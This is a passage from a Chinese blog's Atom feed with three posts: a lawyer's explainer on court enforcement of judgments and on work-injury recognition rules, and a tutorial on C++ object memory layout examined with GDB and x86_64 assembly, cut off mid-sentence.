    <category term="项目实践" scheme="https://selfboot.cn/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="Python" scheme="https://selfboot.cn/tags/Python/"/>
    
    <category term="方法" scheme="https://selfboot.cn/tags/%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>小盛律师解读法院强制执行，知道怎么对付老赖了吧！</title>
    <link href="https://selfboot.cn/2024/05/17/lawer_what_can_be_enforced/"/>
    <id>https://selfboot.cn/2024/05/17/lawer_what_can_be_enforced/</id>
    <published>2024-05-17T21:08:29.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>可能不少人认为，遇到纠纷后，<strong>只要打赢了官司，就能拿到应有的赔偿</strong>。然而一个残酷的现实是，胜诉仅仅是解决纠纷的第一步，如何保证法院的判决被顺利执行，才是关键。有不少案例中，当事人赢了官司，却因对方拒绝履行判决，导致无法获得赔偿。在这种情况下，强制执行才是破解之道。</p><p>但现实中不少人对强制执行有些误解，比如认为法院会主动强制执行，不用自己参与。或者是觉得被执行人把钱转移了，没办法执行到。其实这些观点都不太对，接下来小盛律师来和大家聊聊强制执行的那些事！</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240518_lawer_what_can_be_enforced_cover_v3.png" alt="强制执行思维导图"></p><span id="more"></span><h2 id="强制执行流程"><a href="#强制执行流程" class="headerlink" title="强制执行流程"></a>强制执行流程</h2><p>强制执行是<strong>法院根据生效法律文书（如判决书、裁定书等），对拒不履行的被执行人采取的法律措施</strong>，其目的在于确保法律文书所确定的权益得以实现。首先来看看强制执行的流程，小盛律师总结如下：</p><ol><li><strong>申请强制执行</strong>：当债务人（被执行人）在履行期未履行法院判决等法律文书所确定的义务时，债权人（申请执行人）可以<strong>向法院申请强制执行</strong>，注意这里是要主动申请才行哦，并且<strong>需要在法律文书生效后的2年内发起申请</strong>，这就是<strong>执行时效</strong>。申请的时候一般需要提交<strong>申请执行书、生效法律文书副本、身份证明</strong>等材料；</li><li><strong>法院受理与立案</strong>：法院在收到强制执行申请后，会进行审查并决定是否受理。一旦受理，将正式立案并启动强制执行程序。</li><li><strong>执行通知与财产调查</strong>：法院会向被执行人发出执行通知，责令其履行义务。同时，法院还会对被执行人的财产状况进行调查，以确定可供执行的财产。</li><li><strong>采取执行措施</strong>：根据调查情况，法院会采取相应的执行措施，如<strong>查封、扣押、冻结、拍卖</strong>等，以强制被执行人履行义务。在此过程中，如果被执行人始终不愿意履行，法院有权采取若干强制执行方式。</li><li><strong>执行结果反馈与结案</strong>：执行完毕后，法院会及时将执行结果反馈给申请执行人。如果被执行人始终不愿意履行，法院有权采取若干强制执行方式，直至<strong>义务得以履行或确定无法履行</strong>（如被执行人确无财产可供执行）。如果没有可供执行的财产的话，法院就会终结本次执行（简称：终本），等到发现有可供执行财产的时候，可以申请法院恢复执行。</li></ol><p>如果被执行人或者被执行的财产在外地的，根据<a href="http://gongbao.court.gov.cn/Details/42a89051fa54947fa9d96bf7276b6a.html">《中华人民共和国民事诉讼法》</a>的规定，法院可以委托当地人民法院代为执行，确保了跨地域执行的效率和便捷性。</p><p>强制执行整个过程所需时间因案件具体情况而异。简单的案件可能很快就能执行完毕，而复杂的案件则可能需要更长的时间。这取决于多种因素，如被执行人的财产状况、执行法院的工作效率、以及是否存在执行异议等。</p><h2 id="惩罚措施"><a href="#惩罚措施" class="headerlink" title="惩罚措施"></a>惩罚措施</h2><p>强制执行必然会有一定的惩罚手段，不然怎么叫强制呢？被执行人不履行法律文书确定的义务的，人民法院可以对其采取<strong>限制出境，在征信系统记录、通过媒体公布不履行义务信息</strong>以及法律规定的其他措施。</p><p>债权人也可向<strong>法院申请对被执行人限三高</strong>，这里的三高指的是<strong>高消费、高消费场所、高消费行为</strong>。下面小盛律师列一些影响比较大并且落实的很好的限制行为：</p><ol><li>乘坐交通工具时选择飞机、列车软卧、轮船二等以上舱位；</li><li>购买不动产或者新建、扩建、高档装修房屋；</li><li>乘坐g字头动车组列车全部座位</li></ol><p>此外，还可以申请将符合条件的被执行人纳入<strong>失信被执行人名单</strong>，也就是我们通常说的“老赖”。失信被执行人将在政府采购、招标投标等诸多方面受到限制，真的是一处失信，处处受限。大家可以去<a href="http://zxgk.court.gov.cn/">中国执行信息公开网</a>查询被执行人有没有被列为老赖，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240517_lawer_what_can_be_enforced_query.png" alt="中国执行信息公开网查询失信被执行人"></p><p>此外，如果被执行人恶意对抗执行措施，法院还可以对其采取<strong>司法拘留、罚款、以及追究刑事责任</strong>等措施，以迫使其履行义务。</p><h2 id="可供强制执行的财产"><a href="#可供强制执行的财产" class="headerlink" title="可供强制执行的财产"></a>可供强制执行的财产</h2><p>那么到底有哪些财产可以被强制执行呢？其实除了常见的房、车、现金、存款外，可供强制执行的财产还是很多的。这里小盛律师结合相关法律条款和实践经验，列出常见的可以被强制执行的财产：</p><ol><li><strong>现金和银行存款</strong>：被执行人名下的现金、银行存款是首选的执行标的，法院可以直接划拨或冻结相应账户。</li><li><strong>不动产</strong>：包括房屋、土地等，法院可以查封、拍卖不动产以偿还债务。</li><li><strong>动产</strong>：如车辆、机器设备、珠宝首饰等，同样可以被查封、拍卖。</li><li>股权和证券：被执行人持有的公司股权、股票、债券等证券资产，法院可以依法进行处置。</li><li>知识产权：包括专利、商标、著作权等，这些资产也可以通过转让或许可方式变现以偿还债务。</li><li>到期债权：如果被执行人对外享有到期债权，法院可以向第三方发出履行通知，要求其直接向申请执行人履行。</li><li>其他财产性权益：如保险金、信托受益权等，根据具体情况也可以成为执行标的。</li><li><strong>公积金</strong>：可对被执行人名下的公积金进行强制执行，不受公积金提取条件的限制。</li><li><strong>退休金</strong>：如果被执行人有退休金，也是可以被强制执行。</li><li><strong>虚拟财产</strong>：游戏账号等网络平台中的虚拟财产，不过这部分可能要执行人提供线索才行。</li></ol><p>从司法实践来说，法院查控系统已经与公积金系统、证券系统、保险行业系统、不动产登记系统、财付通、支付宝等多个系统进行了联网，将公积金、不动产、股票、财付通、支付宝、保险产品（分红理财型）均纳入查控范围，一旦发现被执行人名下有可供执行财产的，法院将依法冻结、划拨或提取，对被执行人的财产予以强制执行。</p><p>不过需要注意的是，虽然上述财产可以被强制执行，但具体执行过程中还需考虑多种因素，如财产的性质、价值、权属状况以及执行成本等。此外，法院在执行过程中会依法保护被执行人的基本生活所需，<strong>不会对其生活必需品进行强制执行</strong>。</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>在平时和当事人交流沟通中，小盛律师发现不少人还是有些疑问，这里列出关于强制执行的常见问题供大家参考。</p><p>问题一：被执行人主张其<strong>被查封的房产为其唯一住所，从而反对法院的执行行为</strong>。这种情况下能否免于执行呢？</p><p>回答：唯一住所并不能成为阻止执行的保护罩。根据法律规定，虽然不得对被执行人及其家属生活必需的唯一住房执行拍卖、变卖或用于抵债，但存在以下例外情况：</p><ol><li>被执行人有法定抚养或赡养义务的家庭成员名下存在其他符合生活基本需求的住房；</li><li>被执行人在法律文书生效后，为规避债务而转移其名下的其他房产；</li><li>申请执行人提供符合当地廉租房标准的住房给被执行人及其家属居住，或同意按照当地住房租金市场的平均水平，从所变卖房屋的款项中预扣五至八年的租金。</li></ol><p>问题二：如果申请人<strong>知道被执行人可能在某处拥有财产，但没有详细信息</strong>，该如何处理？</p><p>回答：执行程序是<strong>一场与时间的竞赛，对财产的调查和核实宜早不宜迟</strong>。申请人可以<strong>委托律师利用调查令来查</strong>，律师调查令是法院在民事诉讼中，当事人无法自行收集证据，经申请并获得法院批准后，由律师向相关单位或个人发出的调查指令。接受调查的单位或个人必须依照调查令的要求及时提供相关证据。</p><p>另外也可以向社会公众发起悬赏，当然自己不能直接悬赏，一般是向法院申请，由法院发悬赏公告。对于提供关于被执行人位置或财产线索的信息，一旦查证属实且有助于执行完成，法院将依照规定给予举报人一定的奖金。</p><p>尽管有各种法律手段，来保证强制执行的顺利进行，来保证债务人的合法权益。但是在司法实践中，还是有不少案例，债务人可能无法拿回应有的赔偿。因此，小盛律师提醒大家<strong>不要随便借钱，避免大金额的预付费等行为</strong>，免得到时候虽然赢了官司却要不到钱。</p><hr><p>我是 <a href="https://selfboot.cn/links">小盛律师</a>，欢迎关注我获取更多法律科普。如果有法律纠纷，欢迎付费咨询。</p><div class="pure-g">  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_wx_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_xhs_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_dy_qrcode.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div></div>]]></content>
    
    
    <summary type="html">胜诉仅是解决纠纷的第一步，如果对方拒绝履行，需要强制执行。文章详细介绍了强制执行的流程，包括申请、立案、调查财产、采取措施、反馈结果等环节。同时列举了可供执行的财产种类，如现金存款、不动产、动产、股权证券、知识产权、债权等。法院还可对被执行人采取惩罚措施，如限三高，限制出境、纳入失信名单等。文中还解答了关于唯一住所、财产信息获取等具体执行问题。</summary>
    
    
    
    <category term="法律普及" scheme="https://selfboot.cn/categories/%E6%B3%95%E5%BE%8B%E6%99%AE%E5%8F%8A/"/>
    
    
    <category term="法律" scheme="https://selfboot.cn/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>2024 最新工伤认定标准与案例分析</title>
    <link href="https://selfboot.cn/2024/05/11/work_related_injury/"/>
    <id>https://selfboot.cn/2024/05/11/work_related_injury/</id>
    <published>2024-05-11T11:23:34.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>前两天在小红书上看到一个贴子，大概情况是这样的：</p><blockquote><p>一个中年男人，有两个小孩子，在家里是顶梁柱，在公司是好员工。由于女儿肺炎发烧，他在 5.6 号早上发消息请了 3 天假。结果 7 号上午突发糖尿病酮中毒和心肌梗塞，没抢救过来。公司打算走工伤赔偿，但是被告知这个情况不属于工伤。</p></blockquote><p>哎，看到这个消息有点心酸，一个生命就这样逝去，家人的生活也会因此发生很大的变化。从感情上来说，希望能认定工伤，让家人能够得到一些补偿。但是，作为一个执业律师，我也清楚知道，这种情况不属于工伤。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240510_work_related_injury_cover.png" alt="怎么才能认定是工伤？"></p><p>法律对于认定工伤有明确的规定，接下来我就来给大家科普下怎么才算是工伤。</p><span id="more"></span><h2 id="简单案例分享"><a href="#简单案例分享" class="headerlink" title="简单案例分享"></a>简单案例分享</h2><p>首先来看几个简单的案例。</p><ol><li><p>刘某搭乘同事的车，在去工作单位的路上发生交通事故。本案中，刘某在工作地点附近发生事故，且事故发生在合理的上下班路线上。刘某的目的是<strong>回单位上班，工作时间合理，且事故发生地点属于合理路线</strong>，因此属于工伤。</p></li><li><p>易某在下班后停留两小时吃饭，之后返回居住地，途中顺道探望母亲。对于上下班合理时间的认定，除了合理路线上的往返时间外，还包括日常生活所需的短暂停留时间。在本案中，易某<strong>下班后停留两小时吃饭，超出了合理时间范围，不符合要求</strong>。因此，交通事故伤害不在“上下班途中”，也不符合认定工伤的条件。</p></li><li><p>付某受聘到某环卫处工作，工作岗位是清扫员。某工作日下午16时许，在打扫卫生时，突然感到胸闷，被送到人民医院治疗，诊断为急性左心衰等疾病。虽然是在工作时间和工作场所内突发疾病，但<strong>该疾病并非由工作原因引起，也没有突发疾病死亡或48小时内抢救无效死亡的情况</strong>，因此不属于工伤。</p></li><li><p>政府办事人员张某某准备从家中出发驾车载同事行巡查执法，在其家中客厅门口处突然摔倒并诊断为脑出血后经抢救无效于次日死亡。事发时张某某仍处于其居住的民房内，该<strong>场所并非其工作场所</strong>，也<strong>未处于工作岗位</strong>，因此张某某的死亡不符合工伤认定情形。</p></li></ol><p>有点复杂是吧？接下来小盛律师来结合法律条款，给大家聊聊怎么认定工伤吧。</p><h2 id="认定主体要求"><a href="#认定主体要求" class="headerlink" title="认定主体要求"></a>认定主体要求</h2><p>首先工伤认定的主体应该是<strong>与用人单位建立劳动关系的职工，包括全日制用工及非全日制用工</strong>。这里劳动关系还是很重要的，之前在加班的文章 <a href="https://selfboot.cn/2023/12/09/why_not_overtime_pay/">为什么长时间工作也没有加班费？</a> 有讲过不同劳动关系下的权益不同。</p><p>需要注意的是<strong>工伤认定的主体是不包括劳务用工的，除非法律特殊规定</strong>。这里的特殊规定，比如人力资源和社会保障部于2016年3月28日颁布实施的《<a href="http://www.mohrss.gov.cn/SYrlzyhshbzb/shehuibaozhang/zcwj/gongshang/201603/t20160331_236984.html">关于执行〈工伤保险条例〉若干问题的意见（二）</a>》第二条规定：</p><blockquote><p>二、达到或超过法定退休年龄，但未办理退休手续或者未依法享受城镇职工基本养老保险待遇,继续在原用人单位工作期间受到事故伤害或患职业病的，用人单位依法承担工伤保险责任。<br>用人单位招用已经达到、超过法定退休年龄或已经领取城镇职工基本养老保险待遇的人员，在用工期间因工作原因受到事故伤害或患职业病的，如招用单位已按项目参保等方式为其缴纳工伤保险费的，应适用《工伤保险条例》。</p></blockquote><p>另外《最高人民法院关于超过法定退休年龄的进城务工农民在工作时间内因公伤亡的，能否认定工伤的答复》的意见中提到：</p><blockquote><p>用人单位聘用的超过法定退休年龄的务工农民，在工作时间内、因工作原因伤亡的，应当适用《工伤保险条例》的有关规定进行工伤认定。</p></blockquote><h2 id="认定工伤的情形"><a href="#认定工伤的情形" class="headerlink" title="认定工伤的情形"></a>认定工伤的情形</h2><p>除了前面认定主体的要求，工伤保险条例列出了认定工伤的情形。简单来说可以理解为，<strong>在工作时间和工作地点，因工作原因受到的伤害才能认定工伤</strong>。</p><ul><li>工作时间：包含用人单位<strong>规定的固定上下班时间</strong>，也包括因公外出、工作时间前后从事与工作相关联的工作。</li><li>工作场所：除了用人单位<strong>内部区域，还包括与工作属性相关联的场所</strong>，另外来往于多个与其职责相关的工作场所之间的合理区域也属于工作场所。</li><li>工作内容：除了日常工作内容以外，常见的延伸还有培训、会议、团建等娱乐性质的活动只要是单位组织安排的也属于工作内容。</li></ul><p>此外，下面这种情况也算工伤：在上下班途中，受到非本人主要责任的交通事故或者城市轨道交通、客运轮渡、火车事故伤害的。在《<a href="http://www.mohrss.gov.cn/SYrlzyhshbzb/shehuibaozhang/zcwj/gongshang/201603/t20160331_236984.html">关于执行&lt;工伤保险条例&gt;若干问题的意见（二）</a>》第六条规定，职工<strong>以上下班为目的、在合理时间内往返于工作单位和居住地之间的合理路线，视为上下班途中</strong>。</p><p>对劳动者上下班途中的认定至少应当考虑三个要素：一是<strong>目的要素，即以上下班为目的；二是时间要素，即上下班时间是否合理；三是空间要素，即往返于工作地和居住地的路线是否合理，以及是否存在合理的绕道行为</strong>。只有当这些条件均得到满足时，上下班途中发生的事故才可能被认定为工伤。同时，每个案件的具体情况不同，需根据具体的事实和相关法律规定进行判断。<a href="https://selfboot.cn/links">小盛律师</a>这里列出一些常见的情形：</p><ol><li>上下班途中外出就餐时间，各地认定标准不尽相同，上海法院针对用人单位有禁止外出就餐的规章制度，则不认定“在合理时间内”。</li><li><strong>周末或节假日往返非固定居所是合理路线</strong>，这里包括住所地、经常居住地、单位宿舍以及配偶、父母、子女居住地。</li><li>针对<strong>上下班途中绕路的情形，需要是日常生活必须的</strong>，如接送小孩等不会改变上下班的基本性质。</li></ol><p>此外，还有特殊类型工伤如职业病，需要适用职业病认定标准，这里不展开了。</p><h2 id="法定视同工伤情形"><a href="#法定视同工伤情形" class="headerlink" title="法定视同工伤情形"></a>法定视同工伤情形</h2><p>最后还有一些特殊情况，法律上也会认定是工伤。<a href="https://www.gov.cn/zwgk/2005-05/20/content_144.htm">《工伤保险条例》</a>第十五条规定，视同工伤的情形有三种：</p><blockquote><p>第十五条　职工有下列情形之一的，视同工伤：<br>　　(一)在工作时间和工作岗位，突发疾病死亡或者在48小时之内经抢救无效死亡的；<br>　　(二)在抢险救灾等维护国家利益、公共利益活动中受到伤害的；<br>　　(三)职工原在军队服役，因战、因公负伤致残，已取得革命伤残军人证，到用人单位后旧伤复发的。</p></blockquote><p>每个省份也可能有一些特殊规定，比如<a href="https://www.gd.gov.cn/zwgk/wjk/zcfgk/content/post_2523998.html">《广东省工伤保险条例》</a>第十条多了两种情形：</p><blockquote><p>因工作环境存在有毒有害物质或者在用人单位食堂就餐造成急性中毒而住院抢救治疗，并经县级以上卫生防疫部门验证的；<br>由用人单位指派前往依法宣布为疫区的地方工作而感染疫病的；</p></blockquote><p>要注意的是，对于故意犯罪、醉酒或者吸毒、自残或者自杀等情况，则一律不视为工伤。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>工伤认定是一个比较复杂的过程，需要根据具体的情况来判断。总体来说，只要是在工作时间和工作地点，因工作原因受到的伤害，都可以认定为工伤。满足目的，空间，时间要素的上下班途中的事故也可以认定为工伤。对于法律明确规定的特殊情况，比如突发疾病死亡、抢险救灾等活动受伤等情况也可以认定工伤。</p><p>对于工伤认定有疑问的，欢迎付费咨询<a href="https://selfboot.cn/links">小盛律师</a>。</p><hr><p>我是 <a href="https://selfboot.cn/links">小盛律师</a>，欢迎关注我获取更多法律科普。如果有法律纠纷，欢迎付费咨询。</p><div class="pure-g">  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_wx_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_xhs_qrcode_2.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div>  <div class="pure-u-1 pure-u-md-1-3" style="width: auto;">    <img src="https://slefboot-1251736664.file.myqcloud.com/20230914_dy_qrcode.png" style="height: 200px; margin-right: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">  </div></div>]]></content>
    
    
    <summary type="html">工伤认定是一个比较复杂的过程，需要根据具体的情况来判断。总体来说，只要是在工作时间和工作地点，因工作原因受到的伤害，都可以认定为工伤。满足目的，空间，时间要素的上下班途中的事故也可以认定为工伤。对于法律明确规定的特殊情况，比如突发疾病死亡、抢险救灾等活动受伤等情况也可以认定工伤。</summary>
    
    
    
    <category term="法律普及" scheme="https://selfboot.cn/categories/%E6%B3%95%E5%BE%8B%E6%99%AE%E5%8F%8A/"/>
    
    
    <category term="法律" scheme="https://selfboot.cn/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>结合实例深入理解 C++ 对象的内存布局</title>
    <link href="https://selfboot.cn/2024/05/10/c++_object_model/"/>
    <id>https://selfboot.cn/2024/05/10/c++_object_model/</id>
    <published>2024-05-10T22:32:35.000Z</published>
    <updated>2024-06-07T06:32:37.905Z</updated>
    
    <content type="html"><![CDATA[<p>在前面 <a href="https://selfboot.cn/2024/03/15/object_memory_coredump/">Bazel 依赖缺失导致的 C++ 进程 coredump 问题分析</a> 这篇文章，因为二进制使用了不同版本的 proto 对象，对象的内存布局不一致导致读、写成员的内存地址错乱，进而导致进程 crash 掉。但是当时并没有展开细聊下面的问题：</p><ol><li>对象在内存中是怎么布局的?</li><li>成员方法是如何拿到成员变量的地址？</li></ol><p>这些其实涉及 C++ 的对象模型，《深度探索 C++对象模型：Inside the C++ Object Model》这本书全面聊了这个问题，非常值得一读。不过这本书读起来并不容易，有的内容读过后如果没有加以实践，也很难完全理解。本篇文章试着从实际的例子出发，帮助大家对 C++ 类成员变量和函数在内存布局<strong>有个直观的理解</strong>，后面再读这本书也会容易理解些。</p><span id="more"></span><h2 id="简单对象内存分布"><a href="#简单对象内存分布" class="headerlink" title="简单对象内存分布"></a>简单对象内存分布</h2><p>首先以一个最简单的 Basic 类为例，来看看只含有基本数据类型的对象是怎么分配内存的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">double</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Basic temp;</span><br><span class="line">    temp.a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后，可以用 GDB 来查看对象的内存分布。如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240326_c++_object_model_basic_gdb.png" alt="Basic 基础数据类的内存分布-GDB调试"></p><p>对象 temp 的起始地址是 <code>0x7fffffffe3b0</code>，这是整个对象在内存中的位置。成员变量a的地址也是 <code>0x7fffffffe3b0</code>，表明int a是对象temp中的第一个成员，位于对象的起始位置。成员变量b的类型为double，其地址是 <code>0x7fffffffe3b8</code>(a的地址+8)，内存布局如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240326_c++_object_model_basic_demo.png" alt="Basic 基础数据类的内存分布示意图"></p><p>这里 int类型在当前平台上占用4个字节（可以用sizeof(int)验证），而这里double成员的起始地址与int成员的起始地址之间相差8个字节，说明在a之后存在<strong>内存对齐填充</strong>（具体取决于编译器的实现细节和平台的对齐要求）。内存对齐要求数据的起始地址在某个特定大小(比如 4、8)的倍数上，这样可以<strong>优化硬件和操作系统访问内存的效率</strong>。这是因为许多处理器<strong>访问对齐的内存地址比访问非对齐地址更快</strong>。</p><p>另外在不进行内存对齐的情况下，较大的数据结构可能会跨越多个缓存行或内存页边界，这会导致额外的缓存行或页的加载，降低内存访问效率。不过大多时候我们不需要手动管理内存对齐，编译器和操作系统会自动处理这些问题。</p><h2 id="带方法的对象内存分布"><a href="#带方法的对象内存分布" class="headerlink" title="带方法的对象内存分布"></a>带方法的对象内存分布</h2><p>带有方法的类又是什么样呢？接着上面的例子，在类中增加一个方法 setB，用来设置其中成员 b 的值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Basic</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">double</span> b;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setB</span><span class="params">(<span class="type">double</span> value)</span> </span>&#123;</span><br><span class="line">        b = value; <span class="comment">// 直接访问成员变量b</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Basic temp;</span><br><span class="line">    temp.a = <span class="number">10</span>;</span><br><span class="line">    temp.<span class="built_in">setB</span>(<span class="number">3.14</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 GDB 打印 temp 对象以及成员变量的地址，发现内存布局和前面不带方法的完全一样。整个对象 size 依然是 16，a 和 b 的内存地址分布也是一致的。那么<strong>新增加的成员方法存储在什么位置</strong>？成员方法中又是<strong>如何拿到成员变量的地址</strong>呢？</p><h3 id="成员方法内存布局"><a href="#成员方法内存布局" class="headerlink" title="成员方法内存布局"></a>成员方法内存布局</h3><p>可以在 GDB 里面打印下成员方法的地址，如下图所示。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240329_c++_object_model_method_addr.png" alt="成员方法的存储地址"></p><p>回忆下 Linux 中进程的内存布局，其中<strong>文本段(也叫代码段)是存储程序执行代码的内存区域</strong>，通常是只读的，以防止程序在运行时意外或恶意修改其执行代码。这里 setB 方法地址 <code>0x5555555551d2</code> 就是位于程序的文本段内，可以在 GDB 中用 <code>info target</code> 验证一下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240401_c++_object_model_method_gdb_target.png" alt="成员方法存储在 text 段"></p><p>其中 .text 段的地址范围是 <code>0x0000555555555060 - 0x0000555555555251</code>，setB 刚好在这个范围内。至此前面第一个问题有了答案，<strong>成员方法存储在进程的文本段，添加成员方法不会改变类实例对象的内存布局大小，它们也不占用对象实例的内存空间</strong>。</p><h3 id="成员变量寻址"><a href="#成员变量寻址" class="headerlink" title="成员变量寻址"></a>成员变量寻址</h3><p>那么成员方法中又是如何拿到成员变量的地址呢？在解决这个疑问前，先来仔细看下 setB 的函数原型<code>(void (*)(Basic * const, double))</code>，这里函数的第一个参数是<code>Basic*</code> 指针，而在代码中的调用是这样：<code>temp.setB(3.14)</code>。这种用法其实是一种语法糖，<strong>编译器在调用成员函数时自动将当前对象的地址作为this指针传递给了函数的</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="function">p &amp;<span class="title">Basic::setB</span><span class="params">(<span class="type">double</span>)</span></span></span><br><span class="line"><span class="function">$7 </span>= (<span class="built_in">void</span> (*)(Basic * <span class="type">const</span>, <span class="type">double</span>)) <span class="number">0x5555555551d2</span> &lt;Basic::<span class="built_in">setB</span>(<span class="type">double</span>)&gt;</span><br></pre></td></tr></table></figure><p><strong>这里参数传递了对象的地址，但是在函数里面是怎么拿到成员变量 b 的地址呢？</strong>我们在调用 setB 的地方打断点，执行到断点后，用 step 进入到函数，然后查看相应寄存器的值和汇编代码。整个过程如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240330_c++_object_model_method_disassemble.png" alt="成员方法找到变量地址的汇编代码"></p><p>这里的汇编代码<strong>展示了如何通过 this指针和偏移量访问b</strong>。可以分为两部分，第一部分是处理 this 指针和参数，第二部分是找到成员 b 的内存位置然后进行赋值。</p><p><strong>参数传递部分</strong>。这里<code>mov %rdi,-0x8(%rbp)</code>将 this 指针（通过rdi寄存器传入）保存到栈上。将 double 类型的参数value 通过xmm0寄存器传入保存到栈上。这是 x86_64 机器下 GCC 编译器的传参规定，我们可以通过打印 <code>$rdi</code> 保存的地址来验证确实是 temp 对象的开始地址。</p><p><strong>对象赋值部分</strong>。<code>mov -0x8(%rbp),%rax</code> 将this指针从栈上加载到 rax 寄存器中。类似的，<code>movsd -0x10(%rbp),%xmm0</code> 将参数value从栈上重新加载到xmm0寄存器中。<code>movsd %xmm0,0x8(%rax)</code> 将value写入到this对象的 b 成员。这里 <code>0x8(%rax)</code> 表示rax（即this指针）<strong>加上8字节的偏移，这个偏移正是成员变量b在Basic对象中的位置</strong>。</p><p>这个偏移是什么时候，怎么算出来的呢？其实成员变量的地址相对于对象地址是固定的，对象的地址加上成员变量在对象内的偏移量就是成员变量的实际地址。<strong>编译器在编译时，基于类定义中成员变量的声明顺序和编译器的内存布局规则，计算每个成员变量相对于对象起始地址的偏移量。</strong>然后在运行时，通过基地址（即对象的地址）加上偏移量，就能够计算出每个成员变量的准确地址。这个过程对于程序员来说是透明的，由编译器和运行时系统自动处理。</p><h3 id="函数调用约定与优化"><a href="#函数调用约定与优化" class="headerlink" title="函数调用约定与优化"></a>函数调用约定与优化</h3><p>上面的汇编代码中，setB 的两个参数，都是从寄存器先放到栈上，接着又从栈上放到寄存器进行操作，<strong>为什么要移来移去多此一举呢</strong>？要回答这个问题，需要先了解函数的调用约定和寄存器使用。在x86_64架构的系统调用约定中，前几个整数或指针参数通常通过寄存器（如rdi, rsi, rdx, 等）传递，而浮点参数通过 xmm0 到 xmm7 寄存器传递。这种约定目的是为了<strong>提高函数调用的效率</strong>，因为使用寄存器传递参数比使用栈更快。</p><p>而将寄存器上的参数又移动到栈上，是为了<strong>保证寄存器中的值不被覆盖</strong>。因为寄存器是有限的资源，在函数中可能会被多次用于不同的目的。将值保存到栈上可以让函数内部自由地使用寄存器，而不必担心覆盖调用者的数据。</p><p>接着又将<code>-0x8(%rbp)</code> 放到 rax 寄存器，然后再通过<code>movsd 